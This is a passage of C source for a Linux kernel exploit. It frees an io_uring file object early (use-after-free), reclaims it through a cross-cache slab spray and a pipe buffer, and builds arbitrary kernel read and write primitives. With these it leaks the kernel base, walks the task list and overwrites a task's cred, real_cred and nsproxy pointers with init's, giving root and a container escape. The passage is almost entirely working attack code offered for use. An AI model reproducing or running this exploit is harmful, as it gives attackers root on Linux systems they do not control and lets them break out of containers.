    info("Shared memory @ 0x%lx", g_shmem);

    // Create child
    g_child = fork();
    if (g_child == -1)
    {
        err("`fork()` failed");
    }

    // Child
    if (g_child ==  0)
    {
        child_exec();
    }
    info("Spawned child: %d", g_child);

    // Change our name
    if (prctl(PR_SET_NAME, OUR_TASK, NULL, NULL, NULL) != 0)
    {
        err("`prctl()` failed");
    }

    // Create io ring
    struct io_uring_params params = { 0 };
    if (io_uring_queue_init_params(8, &g_ring, &params))
    {
        err("`io_uring_queue_init_params()` failed");
    }
    info("Created io_uring");

    // Create pipe
    info("Creating pipe...");
    create_pipe();
}

// Decrement file->f_count to 0 and free the filp
void do_uaf(void)
{
    if (io_uring_unregister_files(&g_ring))
    {
        err("`io_uring_unregister_files()` failed");
    }

    // Let the free actually happen
    usleep(100000);
}

// Cross-cache 1:
// Allocate enough objects that we have definitely allocated enough
// slabs to fill up the partial list later when we free an object from each
// slab
void cc_1(void)
{
    // Calculate the amount of objects to spray
    uint64_t spray_amt = (OBJS_PER_SLAB * (CPU_PARTIAL + 1)) * OVERFLOW_FACTOR;
    g_cc1_num = spray_amt;

    // Paranoid
    if (spray_amt > CROSS_CACHE_MAX) { err("Illegal spray amount"); }

    //info("Spraying %lu `filp` objects...", spray_amt);
    for (uint64_t i = 0; i < spray_amt; i++)
    {
        g_cc1_fds[i] = get_test_fd(0);
    }
    usleep(100000);

    return;
}

// Cross-cache 2:
// Allocate OBJS_PER_SLAB to *probably* create a new active slab
void cc_2(void)
{
    // Step 2:
    // Allocate OBJS_PER_SLAB to *probably* create a new active slab
    uint64_t spray_amt = OBJS_PER_SLAB - 1;
    g_cc2_num = spray_amt;

    //info("Spraying %lu `filp` objects...", spray_amt);
    for (uint64_t i = 0; i < spray_amt; i++)
    {
        g_cc2_fds[i] = get_test_fd(0);
    }
    usleep(100000);

    return;
}

// Cross-cache 3:
// Allocate enough objects to definitely fill the rest of the active slab
// and start a new active slab
void cc_3(void)
{
    uint64_t spray_amt = OBJS_PER_SLAB + 1;
    g_cc3_num = spray_amt;

    //info("Spraying %lu `filp` objects...", spray_amt);
    for (uint64_t i = 0; i < spray_amt; i++)
    {
        g_cc3_fds[i] = get_test_fd(0);
    }
    usleep(100000);

    return;
}

// Cross-cache 4:
// Free all the filps from steps 2, and 3. This will place our victim 
// page in the partial list completely empty
void cc_4(void)
{
    //info("Freeing `filp` objects from CC2 and CC3...");
    for (size_t i = 0; i < g_cc2_num; i++)
    {
        close(g_cc2_fds[i]);
    }

    for (size_t i = 0; i < g_cc3_num; i++)
    {
        close(g_cc3_fds[i]);
    }
    usleep(100000);

    return;
}

// Cross-cache 5:
// Free an object for each slab we allocated in Step 1 to overflow the 
// partial list and get our empty slab in the partial list freed
void cc_5(void)
{
    //info("Freeing `filp` objects to overflow CPU partial list...");
    for (size_t i = 0; i < g_cc1_num; i++)
    {
        if (i % OBJS_PER_SLAB == 0)
        {
            close(g_cc1_fds[i]);
        }
    }
    usleep(100000);

    return;
}

// Reset all state associated with a cross-cache attempt
void cc_reset(void)
{
    // Close all the remaining FDs
    info("Resetting cross-cache state...");
    for (size_t i = 0; i < CROSS_CACHE_MAX; i++)
    {
        close(g_cc1_fds[i]);
        close(g_cc2_fds[i]);
        close(g_cc3_fds[i]);
    }

    // Reset number trackers
    g_cc1_num = 0;
    g_cc2_num = 0;
    g_cc3_num = 0;
}

// Do cross cache process
void do_cc(void)
{
    // Start cross-cache process
    cc_1();
    cc_2();

    // Allocate the victim filp
    alloc_victim_filp();

    // Free the victim filp
    do_uaf();

    // Resume cross-cache process
    cc_3();
    cc_4();
    cc_5();

    // Allow pages to be freed
    usleep(100000);
}

void reset_pipe_buf(void)
{
    char buf[4096] = { 0 };
    read(g_pipe.fd[PIPE_READ], buf, 4096);
}

void zero_pipe_buf(void)
{
    char buf[4096] = { 0 };
    write(g_pipe.fd[PIPE_WRITE], buf, 4096);
}

// Offset inside of inode to inode->i_write_hint
#define HINT_OFF 0x8fUL

// By using `fcntl(F_GET_RW_HINT)` we can read a single byte at
// file->inode->i_write_hint
uint64_t read_8_at(unsigned long addr)
{
    // Set the inode address
    uint64_t inode_addr_base = addr - HINT_OFF;

    // Set up the buffer for the arbitrary read
    unsigned char buf[4096] = { 0 };

    // Iterate 8 times to read 8 bytes
    uint64_t val = 0;
    for (size_t i = 0; i < 8; i++)
    {
        // Calculate inode address
        uint64_t target = inode_addr_base + i;

        // Set up a fake file 16 times (number of files per page), we don't know
        // yet which of the 16 slots our UAF file is at
        reset_pipe_buf();
        *(uint64_t *)&buf[0x20]  = target;
        *(uint64_t *)&buf[0x120] = target;
        *(uint64_t *)&buf[0x220] = target;
        *(uint64_t *)&buf[0x320] = target;
        *(uint64_t *)&buf[0x420] = target;
        *(uint64_t *)&buf[0x520] = target;
        *(uint64_t *)&buf[0x620] = target;
        *(uint64_t *)&buf[0x720] = target;
        *(uint64_t *)&buf[0x820] = target;
        *(uint64_t *)&buf[0x920] = target;
        *(uint64_t *)&buf[0xa20] = target;
        *(uint64_t *)&buf[0xb20] = target;
        *(uint64_t *)&buf[0xc20] = target;
        *(uint64_t *)&buf[0xd20] = target;
        *(uint64_t *)&buf[0xe20] = target;
        *(uint64_t *)&buf[0xf20] = target;

        // Create the content
        write(g_pipe.fd[PIPE_WRITE], buf, 4096);

        // Read one byte back
        uint64_t arg = 0;
        if (fcntl(g_uaf_fd, F_GET_RW_HINT, &arg) == -1)
        {
            err("`fcntl()` failed");
        };

        // Add to val
        val |= (arg << (i * 8));
    }

    return val;
}

void read_comm_at(unsigned long addr, char *comm)
{
    // Set the inode address
    uint64_t inode_addr_base = addr - HINT_OFF;

    // Set up the buffer for the arbitrary read
    unsigned char buf[4096] = { 0 };

    // Iterate 15 times to read 15 bytes
    for (size_t i = 0; i < 8; i++)
    {
        // Calculate inode address
        uint64_t target = inode_addr_base + i;

        // Set up a fake file 16 times (number of files per page), we don't know
        // yet which of the 16 slots our UAF file is at
        reset_pipe_buf();
        *(uint64_t *)&buf[0x20]  = target;
        *(uint64_t *)&buf[0x120] = target;
        *(uint64_t *)&buf[0x220] = target;
        *(uint64_t *)&buf[0x320] = target;
        *(uint64_t *)&buf[0x420] = target;
        *(uint64_t *)&buf[0x520] = target;
        *(uint64_t *)&buf[0x620] = target;
        *(uint64_t *)&buf[0x720] = target;
        *(uint64_t *)&buf[0x820] = target;
        *(uint64_t *)&buf[0x920] = target;
        *(uint64_t *)&buf[0xa20] = target;
        *(uint64_t *)&buf[0xb20] = target;
        *(uint64_t *)&buf[0xc20] = target;
        *(uint64_t *)&buf[0xd20] = target;
        *(uint64_t *)&buf[0xe20] = target;
        *(uint64_t *)&buf[0xf20] = target;

        // Create the content
        write(g_pipe.fd[PIPE_WRITE], buf, 4096);

        // Read one byte back
        uint64_t arg = 0;
        if (fcntl(g_uaf_fd, F_GET_RW_HINT, &arg) == -1)
        {
            err("`fcntl()` failed");
        };

        // Add to comm buf
        comm[i] = arg;
    }
}

void write_setup_ctx(char *buf, uint32_t what, uint64_t where)
{
    // Copy our copied real ring fd 
    memcpy(&buf[g_off], g_ring_copy, 256);

    // Set f->f_count to 1 
    uint64_t *count = (uint64_t *)&buf[g_off + 0x38];
    *count = 1;

    // Set f->private_data to our scratch space
    uint64_t *private_data = (uint64_t *)&buf[g_off + 0xc8];
    *private_data = g_scratch;

    // Set ctx->cqe_cached
    size_t cqe_cached = g_scratch + 0x240;
    cqe_cached &= 0xFFF;
    uint64_t *cached_ptr = (uint64_t *)&buf[cqe_cached];
    *cached_ptr = NULL_MEM;

    // Set ctx->cqe_sentinel
    size_t cqe_sentinel = g_scratch + 0x248;
    cqe_sentinel &= 0xFFF;
    uint64_t *sentinel_ptr = (uint64_t *)&buf[cqe_sentinel];

    // We need ctx->cqe_cached < ctx->cqe_sentinel
    *sentinel_ptr = NULL_MEM + 1;

    // Set ctx->rings so that ctx->rings->cq.tail is written to. That is at 
    // offset 0xc0 from cq base address
    size_t rings = g_scratch + 0x10;
    rings &= 0xFFF;
    uint64_t *rings_ptr = (uint64_t *)&buf[rings];
    *rings_ptr = where - 0xc0;

    // Set ctx->cached_cq_tail which is our what
    size_t cq_tail = g_scratch + 0x250;
    cq_tail &= 0xFFF;
    uint32_t *cq_tail_ptr = (uint32_t *)&buf[cq_tail];
    *cq_tail_ptr = what;

    // Set ctx->cq_wait the list head to itself (so that it's "empty")
    size_t real_cq_wait = g_scratch + 0x268;
    size_t cq_wait = (real_cq_wait & 0xFFF);
    uint64_t *cq_wait_ptr = (uint64_t *)&buf[cq_wait];
    *cq_wait_ptr = real_cq_wait;
}

void write_what_where(uint32_t what, uint64_t where)
{
    // Reset the page contents
    reset_pipe_buf();

    // Setup the fake file target ctx
    char buf[4096] = { 0 };
    write_setup_ctx(buf, what, where);

    // Set contents
    write(g_pipe.fd[PIPE_WRITE], buf, 4096);

    // Get an sqe
    struct io_uring_sqe *sqe = NULL;
    sqe = io_uring_get_sqe(&g_ring);
    if (!sqe)
    {
        err("`io_uring_get_sqe()` failed");
    }

    // Set values
    sqe->opcode = IORING_OP_MSG_RING;
    sqe->fd = g_uaf_fd;

    int ret = io_uring_submit(&g_ring);
    if (ret < 0)
    {
        err("`io_uring_submit()` failed");
    }

    // Wait for the completion
    struct io_uring_cqe *cqe;
    ret = io_uring_wait_cqe(&g_ring, &cqe);
}

// So in this kernel code path, after we're done with our write-what-where, the 
// what value actually gets incremented ++ style, so we have to decrement
// the values by one each time.
// Also, we only have a 4 byte write ability so we have to split up the 8 bytes
// into 2 separate writes
void overwrite_cred(void)
{
    uint32_t val_1 = g_cred_what & 0xFFFFFFFF;
    uint32_t val_2 = (g_cred_what >> 32) & 0xFFFFFFFF;

    write_what_where(val_1 - 1, g_cred_where);
    write_what_where(val_2 - 1, g_cred_where + 0x4);
}

void overwrite_real_cred(void)
{
    uint32_t val_1 = g_cred_what & 0xFFFFFFFF;
    uint32_t val_2 = (g_cred_what >> 32) & 0xFFFFFFFF;

    write_what_where(val_1 - 1, g_real_cred_where);
    write_what_where(val_2 - 1, g_real_cred_where + 0x4);
}

void overwrite_nsproxy(void)
{
    uint32_t val_1 = g_nsproxy_what & 0xFFFFFFFF;
    uint32_t val_2 = (g_nsproxy_what >> 32) & 0xFFFFFFFF;

    write_what_where(val_1 - 1, g_nsproxy_where);
    write_what_where(val_2 - 1, g_nsproxy_where + 0x4);
}

// Try to fuzzily validate leaked task addresses lol
int task_valid(uint64_t task)
{
    if ((uint16_t)(task >> 48) == 0xFFFF) { return 1; }
    else { return 0; } 
}

void traverse_tasks(void)
{    
    // Process name buf
    char current_comm[16] = { 0 };

    // Get the next task after init
    uint64_t current_next = read_8_at(g_init_task + TASKS_NEXT_OFF);
    uint64_t current = current_next - TASKS_NEXT_OFF;

    if (!task_valid(current))
    { 
        err("Invalid task after init: 0x%lx", current);    
    }

    // Read the comm
    read_comm_at(current + COMM_OFF, current_comm);
    //printf("    - Address: 0x%lx, Name: '%s'\n", current, current_comm);

    // While we don't have NULL, traverse the list
    while (task_valid(current))
    {
        current_next = read_8_at(current_next);
        current = current_next - TASKS_NEXT_OFF;

        if (current == g_init_task) { break; }

        // Read the comm
        read_comm_at(current + COMM_OFF, current_comm);
        //printf("    - Address: 0x%lx, Name: '%s'\n", current, current_comm);

        // If we find the target comm, save it
        if (!strcmp(current_comm, TARGET_TASK))
        {
            g_target_task = current;
        }

        // If we find our target comm, save it
        if (!strcmp(current_comm, OUR_TASK))
        {
            g_our_task = current;
        }
    }
}

void find_pipe_buf_addr(void)
{
    // Get the base of the files array
    uint64_t files_ptr = read_8_at(g_file_array);
    
    // Adjust the files_ptr to point to our fd in the array
    files_ptr += (sizeof(uint64_t) * g_uaf_fd);

    // Get the address of our UAF file struct
    uint64_t curr_file = read_8_at(files_ptr);

    // Calculate the offset
    g_off = curr_file & 0xFFF;

    // Set the globals
    g_file_addr = curr_file;
    g_pipe_buf = g_file_addr - g_off;

    return;
}

void make_ring_copy(void)
{
    // Get the base of the files array
    uint64_t files_ptr = read_8_at(g_file_array);
    
    // Adjust the files_ptr to point to our ring fd in the array
    files_ptr += (sizeof(uint64_t) * g_ring.ring_fd);

    // Get the address of our UAF file struct
    uint64_t curr_file = read_8_at(files_ptr);

    // Copy all the data into the buffer
    for (size_t i = 0; i < 32; i++)
    {
        uint64_t *val_ptr = (uint64_t *)&g_ring_copy[i * 8];
        *val_ptr = read_8_at(curr_file + (i * 8));
    }
}

// Here, all we're doing is determing what side of the page the UAF file is on,
// if its on the front half of the page, the back half is our scratch space
// and vice versa
void set_scratch_space(void)
{
    g_scratch = g_pipe_buf;
    if (g_off < 0x500) { g_scratch += 0x500; }
}

// We failed cross-cache stage, either because we didnt replace UAF object
void cc_fail(void)
{
    cc_reset();
    close(g_uaf_fd);
    g_uaf_fd = -1;
    release_pipe();
    create_pipe();
    sleep(1);
}

void write_pipe(unsigned char *buf)
{
    if (write(g_pipe.fd[PIPE_WRITE], buf, 4096) == -1)
    {
        err("`write()` failed");
    }
}

int main(int argc, char *argv[])
{
    info("Setting up exploit environment...");
    setup_env();

    // Create a debug buffer
    unsigned char buf[4096] = { 0 };
    memset(buf, 'A', 4096); 

retry_cc:
    // Do cross-cache attempt
    info("Attempting cross-cache...");
    do_cc();

    // Replace UAF file (and page) with pipe page
    write_pipe(buf);

    // Try to `lseek()` which should fail if we succeeded
    if (lseek(g_uaf_fd, 0, SEEK_SET) != -1)
    {
        printf("[!] Cross-cache failed, retrying...");
        cc_fail();
        goto retry_cc;
    }

    // Success
    info("Cross-cache succeeded");
    sleep(1);

    // Leak the `error_entry` pointer
    uint64_t error_entry = read_8_at(ERROR_ENTRY_ADDR);
    info("Leaked `error_entry` address: 0x%lx", error_entry);

    // Make sure it seems kernel-ish
    if ((uint16_t)(error_entry >> 48) != 0xFFFF)
    {
        err("Weird `error_entry` address: 0x%lx", error_entry);
    }

    // Set kernel base
    g_kern_base = error_entry - EE_OFF;
    info("Kernel base: 0x%lx", g_kern_base);

    // Read 8 bytes at that address and see if they match our signature
    uint64_t sig = read_8_at(g_kern_base);
    if (sig != KERNEL_SIGNATURE) 
    {
        err("Bad kernel signature: 0x%lx", sig);
    }

    // Set init_task
    g_init_task = g_kern_base + INIT_OFF;
    info("init_task @ 0x%lx", g_init_task);

    // Get the cred and nsproxy values
    g_cred_what = read_8_at(g_init_task + CRED_OFF);
    g_nsproxy_what = read_8_at(g_init_task + NSPROXY_OFF);

    if ((uint16_t)(g_cred_what >> 48) != 0xFFFF)
    {
        err("Weird init->cred value: 0x%lx", g_cred_what);
    }

    if ((uint16_t)(g_nsproxy_what >> 48) != 0xFFFF)
    {
        err("Weird init->nsproxy value: 0x%lx", g_nsproxy_what);
    }

    info("init cred address: 0x%lx", g_cred_what);
    info("init nsproxy address: 0x%lx", g_nsproxy_what);

    // Traverse the tasks list
    info("Traversing tasks linked list...");
    traverse_tasks();

    // Check to see if we succeeded
    if (!g_target_task) { err("Unable to find target task!"); }
    if (!g_our_task)    { err("Unable to find our task!"); }

    // We found the target task
    info("Found '%s' task @ 0x%lx", TARGET_TASK, g_target_task);
    info("Found '%s' task @ 0x%lx", OUR_TASK, g_our_task);

    // Set where gadgets
    g_cred_where = g_target_task + CRED_OFF;
    g_real_cred_where = g_target_task + REAL_CRED_OFF;
    g_nsproxy_where = g_target_task + NSPROXY_OFF;

    info("Target cred @ 0x%lx", g_cred_where);
    info("Target real_cred @ 0x%lx", g_real_cred_where);
    info("Target nsproxy @ 0x%lx", g_nsproxy_where);

    // Locate our file descriptor table
    g_files = g_our_task + FILES_OFF;
    g_fdt = read_8_at(g_files) + FDT_OFF;
    g_file_array = read_8_at(g_fdt) + FD_ARRAY_OFF;

    info("Our files @ 0x%lx", g_files);
    info("Our file descriptor table @ 0x%lx", g_fdt);
    info("Our file array @ 0x%lx", g_file_array);

    // Find our pipe address
    find_pipe_buf_addr();
    info("UAF file addr: 0x%lx", g_file_addr);
    info("Pipe buffer addr: 0x%lx", g_pipe_buf);

    // Set the global scratch space side of the page
    set_scratch_space();
    info("Scratch space base @ 0x%lx", g_scratch);

    // Make a copy of our real io_uring file descriptor since we need to fake
    // one
    info("Making copy of legitimate io_uring fd...");
    make_ring_copy();
    info("Copy done");

    // Overwrite our task's cred with init's
    info("Overwriting our cred with init's...");
    overwrite_cred();

    // Make sure it's correct
    uint64_t check_cred = read_8_at(g_cred_where);
    if (check_cred != g_cred_what)
    {
        err("check_cred: 0x%lx != g_cred_what: 0x%lx",
            check_cred, g_cred_what);
    }

    // Overwrite our real_cred with init's cred
    sleep(1);
    info("Overwriting our real_cred with init's...");
    overwrite_real_cred();

    // Make sure it's correct
    check_cred = read_8_at(g_real_cred_where);
    if (check_cred != g_cred_what)
    {
        err("check_cred: 0x%lx != g_cred_what: 0x%lx", check_cred, g_cred_what);
    }

    // Overwrite our nsproxy with init's
    sleep(1);
    info("Overwriting our nsproxy with init's...");
    overwrite_nsproxy();

    // Make sure it's correct
    check_cred = read_8_at(g_nsproxy_where);
    if (check_cred != g_nsproxy_what)
    {
        err("check_rec: 0x%lx != g_nsproxy_what: 0x%lx",
            check_cred, g_nsproxy_what);
    }

    info("Creds and namespace look good!");
    
    // Let the child loose
    *(int *)g_shmem = 0x1337;

    sleep(3000);
}
```

